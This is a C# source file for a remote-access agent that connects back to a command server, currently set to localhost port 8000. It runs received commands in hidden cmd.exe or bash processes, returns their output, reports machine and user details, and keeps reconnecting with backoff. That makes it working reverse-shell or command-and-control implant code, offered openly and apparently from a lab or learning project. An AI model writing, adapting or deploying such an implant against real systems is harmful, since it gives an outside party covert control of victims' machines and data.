using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.IO;

/// <summary> Holds global configuration constants for the application </summary>
class AgentConstants{
    public const string SERVER_HOST = "127.0.0.1";
    public const int SERVER_PORT = 8000;
    public const int CONNECT_MAX_DELAY = 120000;
    public const string EOF = "<<<<EOF>>>>";
}

/// <summary> The main Agent class. Responsible for connecting back to the Server and handling received commands </summary>
class Agent {
    static bool Active;
    static int ReconnectDelay;

    static void Main(string[] args){        
        Active = true;
        ReconnectDelay = 10;        
        while(Active){
            try{
                TcpClient Client = new TcpClient();
                Client.Connect(AgentConstants.SERVER_HOST, AgentConstants.SERVER_PORT);
                NetworkStream Stream = Client.GetStream();
                StreamReader Reader = new StreamReader(Stream);
                StreamWriter Writer = new StreamWriter(Stream);
                while(Active){
                    string CommandFinal = Reader.ReadLine();
                    Log("Message received from Server: " + CommandFinal);
                    string Reply = ExecuteCommand(CommandFinal);
                    Writer.WriteLine(Reply);
                    Writer.WriteLine(AgentConstants.EOF);
                    Writer.Flush();                    
                }
                Reader.Close();
                Writer.Close();
                Stream.Close();
                Client.Close();
            }catch(SocketException){
                Log("Error Connecting. Sleeping " + ReconnectDelay + " ms.");
                Thread.Sleep(ReconnectDelay);
                ReconnectDelay *= 2;
                if(ReconnectDelay > AgentConstants.CONNECT_MAX_DELAY){
                    ReconnectDelay = AgentConstants.CONNECT_MAX_DELAY;
                }
            }catch(IOException){

            }
        }
        Log("Exiting.");
    }

    /// <summary> Determines whether the OS is Unix-like </summary>
    /// <returns> True if OS is Unix-like, False otherwise </returns>
    /// <remarks> Based on information found here: https://www.mono-project.com/docs/faq/technical/ </remarks>
    static bool IsUnix(){
        int p = (int)Environment.OSVersion.Platform;
        return ( p == 4 || p == 6 || p == 128);
    }

    /// <summary> Executes the command received from the Server </summary>
    /// <returns> String result of the command. </returns>
    /// <remarks> Implemented commands:
    ///    1) cmd - executes a system command (cmd /c on windows, bash -c on Unix-like systems)
    ///    2) info - returns information about the system
    ///    3) quit - stops listening for commands and exits the Agent software
    ///    4) identify - return a helpful identifying string to the Server (for use in the `list` command)
    /// </remarks>
    static string ExecuteCommand(string cmd){
        string[] tokens = cmd.Split(' ');
        string retValue = "";
        switch(tokens[0].ToLower()){
            case "cmd":
                try{
                    string Command = cmd.Substring(4);
                    Log("command recvd: " + Command);
                    Process exec = new Process();
                    if(IsUnix()){
                        exec.StartInfo.FileName = "bash";
                        exec.StartInfo.Arguments = "-c '" + Command + "'";
                    }else{
                        exec.StartInfo.FileName = "cmd.exe";
                        exec.StartInfo.Arguments = "/c " + Command;
                    }
                    exec.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    exec.StartInfo.CreateNoWindow = true;
                    exec.StartInfo.RedirectStandardOutput = true;
                    exec.StartInfo.RedirectStandardError = true;
                    exec.StartInfo.UseShellExecute = false;   
                    exec.Start();
                    if(exec.WaitForExit(10000)){
                        retValue = exec.StandardOutput.ReadToEnd().Trim() + exec.StandardError.ReadToEnd().Trim();
                    }else{
                        retValue = "Timed out waiting for process to complete.";
                    }
                    Log(retValue);                    
                }catch(Exception e){
                    retValue = String.Format("There was an exception executing command '{0}': {1}", cmd, e.Message);
                    Log(retValue);
                }
                Log("DONE command: " + cmd);
            break;
            case "info":
                retValue = 
                    "Machine Name: "+ Environment.MachineName +"\n" +
                    "OSVersion: " + Environment.OSVersion +"\n" +
                    "Current Directory: " + Environment.CurrentDirectory +"\n" +
                    "System Directory: " + Environment.SystemDirectory +"\n" +
                    "Username: " + Environment.UserName +"\n" +
                    "Domain Username: " + Environment.UserDomainName +"\n" ;
            break;
            case "quit":
                Active = false;
                Log("Received quit. Quitting.");
                retValue = "Quitting. Goodbye.";
            break;
            case "identify":
                retValue = Environment.MachineName + "|" + Environment.UserName + "|" + Environment.OSVersion;
            break;
            default:
                Log("Unknown command: " + cmd);
            break;
        }
        return retValue;
    }

    static void Log(string l){
        Console.WriteLine(l);
    }
}